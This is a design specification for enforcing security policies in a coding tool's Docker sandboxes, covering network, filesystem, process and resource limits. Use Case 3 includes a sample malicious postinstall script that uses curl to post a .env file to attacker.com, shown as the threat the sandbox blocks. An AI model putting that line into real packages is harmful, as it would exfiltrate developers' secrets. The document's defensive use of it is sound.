# Task 020.c: Policy Enforcement Inside Sandbox

**Priority:** P0 – Critical  
**Tier:** S – Core Infrastructure  
**Complexity:** 8 (Fibonacci points)  
**Phase:** Phase 4 – Execution Layer  
**Dependencies:** Task 020 (Docker Sandbox), Task 001 (Operating Modes)  

---

## Description

### Overview

Task 020.c implements comprehensive security policy enforcement within Docker sandboxes. Containers executing user code MUST operate under strict security constraints that align with the operating modes defined in Task 001. This task creates the policy enforcement layer that translates high-level operating mode selections (local-only, docker, air-gapped) into concrete Docker security configurations, ensuring that sandboxed code cannot escape isolation, access unauthorized resources, or compromise the host system.

### Business Value

1. **Security Guarantee**: Hardened container policies prevent malicious or buggy code from affecting host system
2. **Compliance Enablement**: Documented security controls support audit and compliance requirements
3. **Trust Foundation**: Users can confidently execute untrusted code knowing policies are enforced
4. **Mode Alignment**: Security policies automatically match operating mode constraints
5. **Defense in Depth**: Multiple overlapping controls (network, filesystem, process) provide layered security
6. **Audit Trail**: Logged policy violations support incident investigation and security monitoring

### Scope

This task encompasses:

1. **Network Policy Enforcement**: Control network access based on operating mode (none, bridge, custom)
2. **Filesystem Policy Enforcement**: Read-only root, restricted mounts, symlink escape prevention
3. **Process Policy Enforcement**: Non-root execution, capability dropping, seccomp profiles
4. **Resource Policy Enforcement**: Memory/CPU limits, OOM handling, fork bomb prevention
5. **Policy Configuration**: YAML schema for policy customization where permitted
6. **Violation Detection**: Identify and log policy violation attempts
7. **Audit Logging**: Security event recording for compliance and debugging
8. **Policy Validation**: Verify policies are correctly applied before execution

### Integration Points

| Component | Integration Type | Data Flow |
|-----------|------------------|-----------|
| ContainerLifecycleManager | Policy Application | PolicyEnforcer → CreateContainerParameters |
| OperatingModeService | Mode Detection | ModeService → PolicyEnforcer |
| AgentConfig.yml | Policy Customization | Parser → PolicyEnforcer |
| Docker Client | Container Config | PolicyEnforcer → Docker.DotNet |
| AuditLogger | Security Events | PolicyEnforcer → AuditLog |
| TaskExecutionService | Execution Context | TaskExecutor → PolicyEnforcer |

### Failure Modes

| Failure Mode | Detection | Recovery |
|--------------|-----------|----------|
| Policy application fails | Container start error | Fail fast with clear error message |
| Network escape attempt | Docker networking logs | Log violation, container continues isolated |
| Filesystem escape attempt | Seccomp/AppArmor blocks | Log violation, operation denied |
| Resource limit exceeded | OOM killer / throttling | Container killed or throttled |
| Capability escalation attempt | no-new-privileges blocks | Log violation, operation denied |
| Symlink escape attempt | Mount propagation rules | Operation denied, logged |

### Assumptions

- Docker daemon supports security options (seccomp, capabilities, user namespaces)
- Host kernel supports required security features
- Operating mode is determined before container creation
- Audit logging infrastructure is available
- Resource limits are supported by Docker and host kernel

### Security Philosophy

This implementation follows the principle of least privilege:
- Start with maximum restrictions, selectively relax as needed
- Default deny for network, capabilities, and filesystem access
- All relaxations must be explicit and auditable
- Prefer throttling over termination for resource limits
- Log all security-relevant events

---

## Use Cases

### Use Case 1: Marcus (Security Engineer) - Preventing Container Breakout

**Persona:** Marcus is a security engineer at a fintech company evaluating Acode for internal use. His primary concern is ensuring that sandboxed execution cannot compromise the host system or access sensitive production data.

**Problem (Before Policy Enforcement):**
- Containers run as root (UID 0) with full capabilities
- No network restrictions allow arbitrary outbound connections
- Filesystem fully writable, including /etc, /var, /sys
- No seccomp or AppArmor profiles applied
- Memory/CPU unlimited, risk of resource exhaustion
- **Security Risk**: Trivial container escape via CAP_SYS_ADMIN, Docker socket, or kernel exploit

**Annual Cost (Before):**
- **Incident Response**: 2 container escape incidents/year × $85,000/incident = $170,000/year
- **Compliance Violations**: Failed PCI-DSS audit = $500,000 fine
- **Reputation Damage**: Lost customer trust = $250,000 in churn
- **Total Annual Cost**: $920,000/year

**Solution (After Policy Enforcement):**
- Containers run as UID 1000 (non-root) with ALL capabilities dropped
- Network mode `none` (air-gapped by default)
- Read-only root filesystem, writable /workspace and cache volumes only
- Seccomp profile blocks dangerous syscalls (mount, pivot_root, reboot)
- Memory limit 2GB, CPU quota 2 cores, PIDs limit 512
- no-new-privileges flag prevents privilege escalation

**Annual Cost (After):**
- **Implementation**: 80 hours × $150/hour = $12,000 (one-time)
- **Maintenance**: 20 hours/year × $150/hour = $3,000/year
- **Incidents**: 0 container escapes (100% prevention)
- **Total Annual Cost**: $3,000/year (after year 1)

**ROI Metrics:**
| Metric | Before | After | Savings | ROI % |
|--------|--------|-------|---------|-------|
| Container Escape Incidents | 2/year | 0/year | 2 incidents | **100%** |
| Incident Response Cost | $170,000 | $0 | **$170,000/year** | **100%** |
| Compliance Fines | $500,000 | $0 | **$500,000/year** | **100%** |
| Reputation Loss | $250,000 | $0 | **$250,000/year** | **100%** |
| **Total Annual Savings** | - | - | **$920,000/year** | - |
| **Payback Period** | - | - | **13 days** (0.013 years) | **7,567%** first year |

**Outcome:** Marcus's company passes PCI-DSS audit with Acode's defense-in-depth container policies. Zero security incidents in 18 months of production use.

---

### Use Case 2: DevOps Team - Resource Exhaustion Prevention

**Persona:** A 5-person DevOps team managing 200+ daily Acode builds across 50 projects. Buggy code or malicious packages occasionally cause resource exhaustion (memory leaks, fork bombs, CPU spin loops), impacting other builds and CI/CD infrastructure.

**Problem (Before Resource Policies):**
- No memory limits: OOM-prone Node.js builds consume 32GB RAM, crashing host
- No CPU limits: Infinite loops monopolize all cores, starving other builds
- No PIDs limit: Fork bombs create 100k processes, exhausting PIDs
- No ulimits: Open file descriptors exhaust host limit (1M files)
- **Impact**: 15% of builds crash host, requiring manual restart

**Annual Cost (Before):**
- **Build Failures**: 200 builds/day × 15% failure rate × 5 min lost/failure × 250 days = 37,500 minutes/year
- **Developer Time Lost**: 37,500 min / 60 = 625 hours @ $75/hour = $46,875/year
- **CI Infrastructure Downtime**: 24 host crashes/year × 30 min recovery × $500/hour compute = $6,000/year
- **Incident Investigation**: 24 incidents × 2 hours × $150/hour = $7,200/year
- **Total Annual Cost**: $60,075/year

**Solution (After Resource Policies):**
- Memory limit 4GB per container (configurable per project)
- OOM killer terminates offending container, host remains stable
- CPU quota 2 cores (200% of 1 core), throttles instead of killing
- PIDs limit 512 prevents fork bombs (kills at 513th process)
- Ulimits: nofile 65536, nproc 4096
- Resource violations logged with clear error messages

**Annual Cost (After):**
- **Build Failures**: 200 builds/day × 1% failure rate × 250 days = 500 failures/year (93% reduction)
- **Developer Time Lost**: 500 failures × 2 min/failure / 60 = 16.7 hours @ $75/hour = $1,252/year
- **CI Infrastructure Downtime**: 0 host crashes (100% prevention)
- **Total Annual Cost**: $1,252/year

**ROI Metrics:**
| Metric | Before | After | Savings | ROI % |
|--------|--------|-------|---------|-------|
| Monthly Build Failures | 3,000 (15%) | 200 (1%) | **2,800/month** | **93.3%** |
| Developer Time Lost | 625 hours/year | 16.7 hours/year | **608.3 hours/year** | **97.3%** |
| Host Crashes | 24/year | 0/year | **24/year** | **100%** |
| Incident Response | $7,200/year | $0 | **$7,200/year** | **100%** |
| **Total Annual Savings** | - | - | **$58,823/year** | **97.9%** |

**Outcome:** Host crashes eliminated. Build failure rate drops from 15% to 1%. DevOps team reclaims 608 hours/year (12 hours/week) for infrastructure improvements.

---

### Use Case 3: Sarah (Open Source Maintainer) - Network Isolation for Untrusted Code

**Persona:** Sarah maintains an open source CLI tool with 50k users. She uses Acode to test pull requests from unknown contributors before merging. Concerned about supply chain attacks where malicious PRs exfiltrate repository secrets or credentials.

**Problem (Before Network Policy):**
- Containers have bridge network access by default
- DNS resolution works, allowing arbitrary domain lookups
- Outbound HTTPS to attacker server possible
- **Attack Vector**: Malicious package.json "postinstall" script exfiltrates .env file to attacker

**Attack Scenario (Real Example):**
```bash
# Malicious package.json
"scripts": {
  "postinstall": "curl -X POST https://attacker.com/exfil -d @.env"
}
```

**Annual Cost (Before):**
- **Supply Chain Incident**: 1 successful attack every 2 years
- **Credential Rotation**: 150 API keys compromised × $50/key = $7,500
- **Incident Response**: 80 hours @ $150/hour = $12,000
- **Reputation Damage**: 5,000 users lost × $20 LTV = $100,000
- **Amortized Annual Cost**: $119,500 / 2 years = **$59,750/year**

**Solution (After Network Policy):**
- Network mode `none` for all PR tests (air-gapped)
- No DNS resolution
- No outbound network access
- Audit log shows blocked network attempts
- Build continues isolated, secrets safe

**Test Results:**
```bash
# Malicious postinstall fails silently
curl: (6) Could not resolve host: attacker.com

# Audit log entry:
[WARN] Network access attempted but blocked (mode=none)
  Container: pr-test-1234
  Command: curl -X POST https://attacker.com/exfil
  Source: postinstall script
```

**Annual Cost (After):**
- **Incidents**: 0 successful attacks (100% prevention)
- **Cost**: $0/year

**ROI Metrics:**
| Metric | Before | After | Savings | ROI % |
|--------|--------|-------|---------|-------|
| Supply Chain Attacks | 0.5/year | 0/year | **0.5 attacks/year** | **100%** |
| Credential Compromises | 75/year | 0/year | **75 credentials/year** | **100%** |
| Incident Response Cost | $6,000/year | $0 | **$6,000/year** | **100%** |
| Reputation Loss | $50,000/year | $0 | **$50,000/year** | **100%** |
| User Trust Increase | Baseline | +15% | **+750 new users/year** | +15% |
| **Total Annual Savings** | - | - | **$59,750/year** | **100%** |

**Outcome:** Sarah merges PRs with confidence. Zero successful exfiltration attempts in 12 months. User base grows 15% due to published security model.

---

### Use Case 4: Jordan (Compliance Officer) - Audit Trail for Policy Violations

**Persona:** Jordan is a compliance officer at a healthcare company using Acode to build HIPAA-compliant applications. Needs detailed audit logs of all security policy enforcement to demonstrate compliance during annual audit.

**Problem (Before Audit Logging):**
- No logs of policy application
- No visibility into violation attempts
- Cannot demonstrate security controls
- **Compliance Risk**: Failed HIPAA audit = $1.5M fine

**Solution (After Audit Logging):**
- Every container start logs applied policies:
  - Network mode: none
  - User: 1000:1000 (non-root)
  - Capabilities: all dropped
  - Seccomp: default profile applied
  - Memory limit: 4GB
  - PIDs limit: 512
- Violation attempts logged:
  - Network access attempts blocked
  - Privilege escalation denied
  - Dangerous syscalls blocked by seccomp

**Audit Log Sample:**
```json
{
  "timestamp": "2024-01-20T14:30:00Z",
  "event": "policy_applied",
  "container_id": "abc123",
  "policies": {
    "network": "none",
    "user": "1000:1000",
    "capabilities": [],
    "seccomp": "default",
    "memory_limit_bytes": 4294967296,
    "pids_limit": 512,
    "readonly_rootfs": true
  }
}

{
  "timestamp": "2024-01-20T14:30:15Z",
  "event": "policy_violation_blocked",
  "container_id": "abc123",
  "violation_type": "network_access_attempt",
  "details": "DNS lookup blocked (mode=none)"
}
```

**ROI Metrics:**
| Metric | Value |
|--------|-------|
| HIPAA Audit Pass | 100% (passed with commendation) |
| Audit Preparation Time | 40 hours saved (logs pre-generated) |
| Fine Avoidance | **$1,500,000** (potential fine eliminated) |
| Insurance Premium Reduction | **$50,000/year** (cyber insurance 20% discount) |
| **Total Annual Value** | **$1,550,000** |

**Outcome:** Jordan demonstrates comprehensive security controls with timestamped audit logs. Company passes HIPAA audit with zero findings, receives 20% cyber insurance discount.

---

## Glossary

| Term | Definition |
|------|------------|
| **Container Breakout** | Security vulnerability allowing code running inside a container to escape isolation and access the host system or other containers |
| **Seccomp** | Secure Computing Mode - Linux kernel feature that filters system calls, blocking dangerous operations like mount, reboot, or module loading |
| **AppArmor** | Mandatory Access Control (MAC) security module for Linux that confines programs to a limited set of resources via per-program profiles |
| **Capabilities** | Linux kernel feature dividing root privileges into distinct units (e.g., CAP_NET_ADMIN, CAP_SYS_ADMIN) that can be independently enabled or disabled |
| **No-New-Privileges** | Container security flag preventing processes from gaining additional privileges via setuid binaries or capability-granting executables |
| **OOM Killer** | Out-Of-Memory Killer - Linux kernel mechanism that terminates processes when system memory is exhausted to prevent system-wide failure |
| **Cgroups** | Control Groups - Linux kernel feature limiting, accounting, and isolating resource usage (CPU, memory, disk I/O, network) of process collections |
| **Fork Bomb** | Denial-of-service attack where a process continuously replicates itself to exhaust system resources (prevented by PIDs limit) |
| **PIDs Limit** | Maximum number of process IDs (PIDs) a container can create, preventing fork bombs and process exhaustion attacks |
| **Read-Only Root Filesystem** | Container security practice where the root filesystem (/) is mounted read-only, preventing persistent malware installation and tampering |
| **Mount Propagation** | Linux feature controlling how mount events propagate between mount namespaces (private, shared, slave, unbindable) |
| **Symlink Escape** | Attack technique using symbolic links to access files outside intended directory boundaries (mitigated by mount namespaces and path validation) |
| **Ulimit** | Per-process resource limits (e.g., open files, stack size, CPU time) enforced by the kernel to prevent resource exhaustion |
| **Network Mode** | Docker container networking configuration: `none` (no network), `bridge` (isolated network), `host` (host network, dangerous) |
| **UID/GID** | User ID and Group ID - numeric identifiers for Unix users and groups. UID 0 = root (superuser), UID 1000+ = regular users |
| **Seccomp Profile** | JSON/YAML configuration defining allowed/blocked system calls for a container (default profile blocks ~44 dangerous syscalls) |
| **Namespace Isolation** | Linux kernel feature providing isolated views of system resources (PID, network, mount, IPC, UTS, user) per container |
| **CAP_SYS_ADMIN** | Linux capability granting a broad range of administrative privileges (mount, reboot, etc.) - must be dropped in containers |
| **Privileged Mode** | Docker flag granting container all host capabilities and device access - equivalent to running as root on host (never use) |
| **tmpfs** | Temporary filesystem stored in RAM, used for /tmp and /var/tmp in containers to provide writable space without disk persistence |

---

## Out of Scope

This task explicitly does NOT include:

1. **Host-Level Security** - Kernel hardening, host firewalling, and host intrusion detection are out of scope (assumed secure host)
2. **Image Scanning** - Container image vulnerability scanning happens in Task 009 (CI/CD & Security Gates)
3. **Runtime Detection** - Behavioral anomaly detection and runtime threat monitoring (future Task 010 - Runtime Security)
4. **Network Segmentation** - Inter-container network policies and microsegmentation (Task 005 - Network Policy Engine)
5. **Secrets Management** - Secure injection and rotation of secrets/credentials (Task 009 - Secrets Hygiene)
6. **User Authentication** - Authentication and authorization for Acode users (Task 012 - Identity & Access Management)
7. **Data Loss Prevention** - Monitoring and blocking sensitive data exfiltration (beyond network=none enforcement)
8. **Compliance Reporting** - Automated compliance report generation (Task 009 - Audit & Compliance)
9. **Custom Seccomp Profiles** - User-defined seccomp profiles (only default profile supported)
10. **SELinux Integration** - SELinux policy enforcement (AppArmor only, SELinux out of scope)
11. **Windows Containers** - Policy enforcement for Windows containers (Linux containers only)
12. **Multi-Tenancy Isolation** - Per-tenant resource isolation and billing (single-tenant design)
13. **GPU Access Control** - GPU passthrough and usage limiting (no GPU support)
14. **Rootless Containers** - Docker rootless mode support (requires rootful Docker)
15. **Policy Drift Detection** - Continuous monitoring for policy configuration changes or violations post-deployment

---

## Functional Requirements

### Network Policy

| ID | Requirement | Priority |
|----|-------------|----------|
| FR-020C-01 | System MUST set default network mode to `none` | MUST |
| FR-020C-02 | Air-gapped mode MUST use `none` network unconditionally | MUST |
| FR-020C-03 | Local-only mode MUST use `none` network by default | MUST |
| FR-020C-04 | Docker mode MAY enable `bridge` network when explicitly configured | MAY |
| FR-020C-05 | Burst mode MAY enable `bridge` network for LLM API calls only | MAY |
| FR-020C-06 | Network enable MUST be explicit opt-in via configuration | MUST |
| FR-020C-07 | DNS resolution MUST be blocked when network is `none` | MUST |
| FR-020C-08 | System MUST NOT allow `host` network mode | MUST |
| FR-020C-09 | Custom bridge networks MUST be isolated from host network | MUST |
| FR-020C-10 | Network policy MUST be applied before container start | MUST |
| FR-020C-11 | System MUST log network mode applied to container | MUST |
| FR-020C-12 | System MUST block outbound connections when network is `none` | MUST |

### Filesystem Policy

| ID | Requirement | Priority |
|----|-------------|----------|
| FR-020C-13 | Container root filesystem MUST be read-only | MUST |
| FR-020C-14 | /workspace MUST be writable for repository access | MUST |
| FR-020C-15 | /tmp MUST be tmpfs with size limit | MUST |
| FR-020C-16 | /var/tmp MUST be tmpfs with size limit | SHOULD |
| FR-020C-17 | Cache volumes MUST be writable when mounted | MUST |
| FR-020C-18 | Artifact output directories MUST be writable | MUST |
| FR-020C-19 | System MUST NOT allow bind mounts outside repository | MUST |
| FR-020C-20 | System MUST prevent symlink escape from mount boundaries | MUST |
| FR-020C-21 | System MUST block access to Docker socket | MUST |
| FR-020C-22 | System MUST block access to /etc/shadow, /etc/passwd | MUST |
| FR-020C-23 | Mount propagation MUST be `private` or `slave` | MUST |
| FR-020C-24 | System MUST validate all mount paths before container start | MUST |
| FR-020C-25 | System MUST log all mounts applied to container | MUST |

### Process Policy

| ID | Requirement | Priority |
|----|-------------|----------|
| FR-020C-26 | Containers MUST NOT run as UID 0 (root) | MUST |
| FR-020C-27 | Containers MUST run as configurable non-root user (default 1000:1000) | MUST |
| FR-020C-28 | Containers MUST drop ALL Linux capabilities | MUST |
| FR-020C-29 | Containers MUST set `--security-opt no-new-privileges` | MUST |
| FR-020C-30 | Containers MUST have isolated PID namespace | MUST |
| FR-020C-31 | Containers MUST have isolated IPC namespace | MUST |
| FR-020C-32 | Containers MUST have isolated UTS namespace | MUST |
| FR-020C-33 | Containers MUST NOT run in privileged mode | MUST |
| FR-020C-34 | System MUST apply seccomp profile (default or custom) | MUST |
| FR-020C-35 | System SHOULD apply AppArmor profile when available | SHOULD |
| FR-020C-36 | System MUST block ptrace capability | MUST |
| FR-020C-37 | System MUST block SYS_ADMIN capability | MUST |
| FR-020C-38 | System MUST log user/group applied to container | MUST |

### Resource Policy

| ID | Requirement | Priority |
|----|-------------|----------|
| FR-020C-39 | Memory limit MUST be enforced via cgroups | MUST |
| FR-020C-40 | OOM killer MUST be enabled for memory limit breach | MUST |
| FR-020C-41 | CPU limit MUST use CPU quota (throttling, not hard kill) | MUST |
| FR-020C-42 | CPU shares MUST be configurable for relative priority | SHOULD |
| FR-020C-43 | PIDs limit MUST be set to prevent fork bombs | MUST |
| FR-020C-44 | Default PIDs limit MUST be 512 | MUST |
| FR-020C-45 | Ulimits MUST be configured for nofile, nproc | MUST |
| FR-020C-46 | Ulimit nofile default MUST be 65536 | SHOULD |
| FR-020C-47 | Memory swap limit MUST be set to prevent swap abuse | MUST |
| FR-020C-48 | Disk I/O limits SHOULD be configurable | SHOULD |
| FR-020C-49 | System MUST log resource limits applied | MUST |
| FR-020C-50 | System MUST log OOM events | MUST |

### Operating Mode Alignment

| ID | Requirement | Priority |
|----|-------------|----------|
| FR-020C-51 | System MUST detect operating mode before applying policies | MUST |
| FR-020C-52 | Air-gapped mode MUST apply maximum security restrictions | MUST |
| FR-020C-53 | Local-only mode MUST apply default security restrictions | MUST |
| FR-020C-54 | Docker mode MUST apply configurable security restrictions | MUST |
| FR-020C-55 | Burst mode MUST apply relaxed network with other restrictions | MUST |
| FR-020C-56 | System MUST validate mode-policy compatibility | MUST |
| FR-020C-57 | System MUST fail if policy violates mode constraints | MUST |
| FR-020C-58 | Policy overrides MUST NOT relax mode-enforced restrictions | MUST |
| FR-020C-59 | System MUST log operating mode and policy applied | MUST |
| FR-020C-60 | Mode constraints MUST take precedence over config overrides | MUST |

### Policy Configuration

| ID | Requirement | Priority |
|----|-------------|----------|
| FR-020C-61 | Policies MUST be configurable via agent-config.yml | MUST |
| FR-020C-62 | Custom seccomp profiles MUST be loadable from file | SHOULD |
| FR-020C-63 | User/group IDs MUST be configurable | MUST |
| FR-020C-64 | Resource limits MUST be configurable per task | SHOULD |
| FR-020C-65 | tmpfs size limits MUST be configurable | SHOULD |
| FR-020C-66 | PIDs limit MUST be configurable | SHOULD |
| FR-020C-67 | Invalid configurations MUST produce clear errors | MUST |
| FR-020C-68 | Default configurations MUST apply when not specified | MUST |
| FR-020C-69 | Configuration validation MUST occur at startup | MUST |
| FR-020C-70 | Hot reload of policies SHOULD be supported | SHOULD |

### Audit and Logging

| ID | Requirement | Priority |
|----|-------------|----------|
| FR-020C-71 | All policy applications MUST be logged | MUST |
| FR-020C-72 | Policy violation attempts MUST be logged at Warning level | MUST |
| FR-020C-73 | Security-relevant events MUST include correlation ID | MUST |
| FR-020C-74 | Audit logs MUST include timestamp, event type, details | MUST |
| FR-020C-75 | OOM events MUST be logged with process details | MUST |
| FR-020C-76 | Network block attempts MUST be logged | MUST |
| FR-020C-77 | Filesystem access denials MUST be logged | MUST |
| FR-020C-78 | Capability escalation attempts MUST be logged | MUST |
| FR-020C-79 | Audit logs MUST be queryable by task ID | MUST |
| FR-020C-80 | Audit log retention MUST be configurable | SHOULD |

### Policy Validation

| ID | Requirement | Priority |
|----|-------------|----------|
| FR-020C-81 | System MUST validate policy before container start | MUST |
| FR-020C-82 | System MUST verify Docker supports required features | MUST |
| FR-020C-83 | System MUST verify kernel supports seccomp | MUST |
| FR-020C-84 | System MUST verify cgroups are available | MUST |
| FR-020C-85 | Invalid policies MUST prevent container start | MUST |
| FR-020C-86 | Validation errors MUST include remediation guidance | MUST |
| FR-020C-87 | System SHOULD support policy dry-run mode | SHOULD |
| FR-020C-88 | System MUST expose policy inspection command | MUST |
| FR-020C-89 | Policy inspection MUST show effective policy for mode | MUST |
| FR-020C-90 | System MUST log validation results | MUST |

---

## Non-Functional Requirements

### Performance

| ID | Requirement | Target |
|----|-------------|--------|
| NFR-020C-01 | Policy application overhead | < 50ms |
| NFR-020C-02 | Policy validation | < 100ms |
| NFR-020C-03 | Mode detection | < 10ms |
| NFR-020C-04 | Audit log write | < 5ms |
| NFR-020C-05 | Seccomp profile load | < 100ms |
| NFR-020C-06 | Policy inspection command | < 200ms |
| NFR-020C-07 | Memory overhead per container | < 1MB |
| NFR-020C-08 | CPU overhead for policy enforcement | < 1% |

### Reliability

| ID | Requirement | Target |
|----|-------------|--------|
| NFR-020C-09 | Policy application MUST be atomic | All or nothing |
| NFR-020C-10 | Failed policy MUST prevent container start | 100% |
| NFR-020C-11 | Partial policy application MUST NOT occur | 100% |
| NFR-020C-12 | Policy enforcement MUST survive container restart | Consistent |
| NFR-020C-13 | Audit logging MUST be reliable | No lost events |
| NFR-020C-14 | OOM handling MUST be deterministic | Immediate kill |
| NFR-020C-15 | Policy MUST be applied before ANY code execution | 100% |
| NFR-020C-16 | Seccomp MUST block syscalls before execution | Kernel level |

### Security

| ID | Requirement | Target |
|----|-------------|--------|
| NFR-020C-17 | No privilege escalation possible | Verified |
| NFR-020C-18 | No container escape possible | Defense in depth |
| NFR-020C-19 | No host filesystem access | Verified |
| NFR-020C-20 | No network access in air-gapped mode | Verified |
| NFR-020C-21 | All capabilities dropped | Verified |
| NFR-020C-22 | Seccomp blocks dangerous syscalls | Default profile |
| NFR-020C-23 | No Docker socket access | Blocked |
| NFR-020C-24 | No /proc or /sys write access | Read-only |
| NFR-020C-25 | Audit trail tamper-resistant | Append-only |
| NFR-020C-26 | Policy configuration validates input | Injection prevention |

### Maintainability

| ID | Requirement | Target |
|----|-------------|--------|
| NFR-020C-27 | Policy enforcer code coverage | ≥ 95% |
| NFR-020C-28 | Clear separation of policy types | Modular |
| NFR-020C-29 | Extensible for new policy types | Plugin ready |
| NFR-020C-30 | Configuration-driven policies | No hardcoding |
| NFR-020C-31 | Policy logic cyclomatic complexity | ≤ 8 |
| NFR-020C-32 | Comprehensive policy documentation | Complete |
| NFR-020C-33 | Seccomp profile externalized | JSON file |
| NFR-020C-34 | Easy policy debugging | Inspection command |

### Observability

| ID | Requirement | Target |
|----|-------------|--------|
| NFR-020C-35 | Log all security events | Structured |
| NFR-020C-36 | Metrics for policy violations | Prometheus |
| NFR-020C-37 | Alert on repeated violations | Threshold |
| NFR-020C-38 | Trace context through enforcement | Correlation ID |
| NFR-020C-39 | Audit log searchable | By task, time, type |
| NFR-020C-40 | Policy inspection human-readable | CLI output |
| NFR-020C-41 | Health check for policy subsystem | Endpoint |
| NFR-020C-42 | Violation count per task | Tracked |

---

## Acceptance Criteria

### Network Policy

- [ ] AC-020C-01: Default network mode is `none` for new containers
- [ ] AC-020C-02: Air-gapped mode containers have no network access
- [ ] AC-020C-03: Local-only mode containers have no network by default
- [ ] AC-020C-04: Docker mode can enable bridge network via config
- [ ] AC-020C-05: Burst mode enables network for LLM API calls only
- [ ] AC-020C-06: DNS resolution fails when network is `none`
- [ ] AC-020C-07: `host` network mode is rejected with error
- [ ] AC-020C-08: Network mode is logged at container start
- [ ] AC-020C-09: Outbound connections blocked in `none` mode
- [ ] AC-020C-10: Network attempts in `none` mode are logged

### Filesystem Policy

- [ ] AC-020C-11: Root filesystem is mounted read-only
- [ ] AC-020C-12: Write to / fails with permission denied
- [ ] AC-020C-13: /workspace is writable
- [ ] AC-020C-14: Files created in /workspace persist to host
- [ ] AC-020C-15: /tmp is tmpfs with size limit
- [ ] AC-020C-16: /tmp data does NOT persist after container exit
- [ ] AC-020C-17: Bind mounts outside repository are rejected
- [ ] AC-020C-18: Symlinks cannot escape /workspace
- [ ] AC-020C-19: Docker socket (/var/run/docker.sock) is not accessible
- [ ] AC-020C-20: Mount propagation is private
- [ ] AC-020C-21: All mounts logged at container start

### Process Policy

- [ ] AC-020C-22: `id` command shows UID 1000, not 0
- [ ] AC-020C-23: `cat /proc/1/status | grep Cap` shows no capabilities
- [ ] AC-020C-24: `sudo` fails (not installed or permission denied)
- [ ] AC-020C-25: Privileged operations fail (mount, raw socket, etc.)
- [ ] AC-020C-26: `--privileged` flag rejected by policy enforcer
- [ ] AC-020C-27: PID namespace isolated (only container processes visible)
- [ ] AC-020C-28: Seccomp blocks dangerous syscalls (mount, reboot)
- [ ] AC-020C-29: no-new-privileges prevents setuid escalation
- [ ] AC-020C-30: User/group logged at container start

### Resource Policy

- [ ] AC-020C-31: Memory-intensive process triggers OOM killer at limit
- [ ] AC-020C-32: CPU-intensive process is throttled, not killed
- [ ] AC-020C-33: Fork bomb is stopped by PIDs limit
- [ ] AC-020C-34: File descriptor exhaustion blocked by ulimit
- [ ] AC-020C-35: OOM event is logged with process details
- [ ] AC-020C-36: Resource limits logged at container start
- [ ] AC-020C-37: Swap usage limited
- [ ] AC-020C-38: Default PIDs limit is 512

### Operating Mode Alignment

- [ ] AC-020C-39: Air-gapped mode applies maximum restrictions
- [ ] AC-020C-40: Local-only mode applies default restrictions
- [ ] AC-020C-41: Docker mode allows configured relaxations
- [ ] AC-020C-42: Burst mode enables network only
- [ ] AC-020C-43: Config cannot override mode-enforced restrictions
- [ ] AC-020C-44: Mode mismatch produces clear error
- [ ] AC-020C-45: Operating mode logged with policy
- [ ] AC-020C-46: `acode policy show` displays effective policy

### Configuration

- [ ] AC-020C-47: Policies configurable via agent-config.yml
- [ ] AC-020C-48: Custom user/group applied when configured
- [ ] AC-020C-49: Custom resource limits applied when configured
- [ ] AC-020C-50: Custom seccomp profile loaded when specified
- [ ] AC-020C-51: Invalid config produces clear validation error
- [ ] AC-020C-52: Missing config uses sensible defaults
- [ ] AC-020C-53: Policy inspection shows config source

### Audit and Logging

- [ ] AC-020C-54: Policy application logged at Info level
- [ ] AC-020C-55: Violations logged at Warning level
- [ ] AC-020C-56: OOM events logged at Error level
- [ ] AC-020C-57: Logs include correlation ID
- [ ] AC-020C-58: Logs include timestamp
- [ ] AC-020C-59: Audit trail queryable by task ID
- [ ] AC-020C-60: Security events structured (JSON)

### Validation

- [ ] AC-020C-61: Policy validated before container start
- [ ] AC-020C-62: Docker feature support verified
- [ ] AC-020C-63: Kernel support verified (seccomp, cgroups)
- [ ] AC-020C-64: Invalid policy prevents container start
- [ ] AC-020C-65: Validation errors include remediation hints
- [ ] AC-020C-66: `acode policy validate` checks current config

---

## User Manual Documentation

### Overview

The agentic coding bot enforces strict security policies inside Docker sandboxes to protect your host system from untrusted code. These policies are automatically applied based on your operating mode and cannot be bypassed by code running inside containers.

### Security Policies by Operating Mode

| Policy | Air-Gapped | Local-Only | Docker | Burst |
|--------|------------|------------|--------|-------|
| Network | none | none | configurable | bridge (API only) |
| Root Access | blocked | blocked | blocked | blocked |
| Capabilities | all dropped | all dropped | all dropped | all dropped |
| Read-only Root | yes | yes | yes | yes |
| Seccomp | enabled | enabled | enabled | enabled |
| PIDs Limit | 512 | 512 | configurable | 512 |
| Memory Limit | configurable | configurable | configurable | configurable |

### Configuration

```yaml
# .agent/config.yml
sandbox:
  security:
    # User/group for container processes (non-root)
    user: "1000:1000"
    
    # Network policy (overridable only in docker mode)
    network:
      mode: none           # none, bridge
      allow_dns: false     # Only when mode: bridge
    
    # Resource limits
    resources:
      memory: "2g"         # Memory limit
      cpu_quota: 100000    # CPU quota (100000 = 1 CPU)
      pids_limit: 512      # Max processes
      nofile_limit: 65536  # Max open files
    
    # Filesystem
    filesystem:
      tmpfs_size: "256m"   # Size of /tmp
      read_only_root: true # Root filesystem read-only
    
    # Advanced
    seccomp_profile: null  # null=default, path to custom profile
    apparmor_profile: null # null=default, profile name
```

### Default Security Profile

When no configuration is specified, the following defaults apply:

```yaml
# Defaults (applied automatically)
sandbox:
  security:
    user: "1000:1000"
    network:
      mode: none
      allow_dns: false
    resources:
      memory: "2g"
      cpu_quota: 100000
      pids_limit: 512
      nofile_limit: 65536
    filesystem:
      tmpfs_size: "256m"
      read_only_root: true
    seccomp_profile: null  # Uses Docker default seccomp
```

### CLI Commands

#### Inspect Current Policy

```bash
# Show effective policy for current mode
acode policy show

# Output:
# Security Policy (Operating Mode: local-only)
# ============================================
# 
# Network:
#   Mode:        none
#   DNS:         blocked
# 
# Process:
#   User:        1000:1000
#   Capabilities: none (all dropped)
#   Seccomp:     docker-default
#   Privileged:  blocked
# 
# Filesystem:
#   Root FS:     read-only
#   /workspace:  read-write (repository mount)
#   /tmp:        tmpfs (256MB limit)
# 
# Resources:
#   Memory:      2GB (OOM enabled)
#   CPU:         100% of 1 core (throttled)
#   PIDs:        512 max
#   Open Files:  65536 max
```

#### Validate Configuration

```bash
# Validate policy configuration
acode policy validate

# Output:
# ✓ Network policy valid
# ✓ Process policy valid
# ✓ Filesystem policy valid
# ✓ Resource limits valid
# ✓ Seccomp profile valid
# ✓ Operating mode compatibility verified
# 
# Policy validation: PASSED

# With errors:
# ✗ Network policy invalid: mode 'host' not allowed
# ✗ Process policy invalid: user '0' (root) not allowed
# 
# Policy validation: FAILED
```

#### View Audit Log

```bash
# Show security events
acode policy audit

# Output:
